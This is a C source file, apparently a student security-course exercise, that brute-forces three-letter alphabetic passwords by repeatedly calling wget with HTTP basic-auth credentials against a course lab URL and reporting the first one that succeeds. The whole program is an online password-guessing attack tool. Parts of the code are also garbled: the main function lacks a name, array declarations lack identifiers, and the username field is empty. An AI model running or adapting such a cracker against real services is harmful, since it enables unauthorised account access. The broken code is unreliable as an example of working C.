


#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <strings.h>
#include <ctype.h>

char *itoa(int); 

int ()
{
  int t,t1,t2, timeinsec;    
  int nofattempts = 0;
  char url[80], url1[80], *ur1, *ur2;
  strcpy(url, "wget --http-user= --http-passwd=");     
  strcpy(url1, " http://sec-crack.cs.rmit.edu./SEC/2/ -o out.txt"); 
  int i = 65;
  int j ;
  int k ;
  char *c1, *c2, *c3;
  char *c12, pass[4];
  int syst = 1;
  char a = 'a';
  char inside[50];
  t1 = time();  

  



  for (i = 65; i <= 122; i++)          
  {
    if (i > 90 && i < 97) continue;    

    for (j = 65; j <= 122; j++)        
    {
      if (j > 90 && j < 97) continue;  

      for (k = 65; k <= 122; k++)     
      {
          fflush(stdin);
          if (k > 90 && k < 97) continue;  

          c1 = itoa(i);  
          c2 = itoa(j);  
          c3 = itoa(k);  
          pass[0] = *c1;
          pass[1] = *c2;
          pass[2] = *c3;
    	  pass[3] = '\0';
          strcat(url, pass);  
          strcat(url, url1);  
	      ++nofattempts;  
          syst = system(url);  
          printf("%s\n",pass);
          if (syst == 0)  
          {
            t2 = time();
            t = t2 - t1; 
            timeinsec = t / 1000000000;
            printf("  Total .of attempts :-  %d", nofattempts);
            printf("\n !!! 's the password:- %s\n", pass);
            printf("\n Brute force has taken  much of time_var :-  %lld seconds\n", timeinsec);
            exit(1);
          }
	      strcpy(url, "");
    	  strcpy(url, "wget --http-user= --http-passwd=");
      }
    }
  }
  exit(0);
}

char *itoa(int a)  
{
    char *[26] = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l",  
                     "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x",
                      "y", "z" };
    char *[26] = { "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L",
                     "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X",
                      "Y", "Z" };

  char *ret;
  if ( a >= 97 && a <= 122)   
  {
      ret =  [a-97];
      return ret;
  }
 if ( a >= 65 && a <= 90)     
  {
      ret =  [a-65];
      return ret;
  }

  return "5";
}
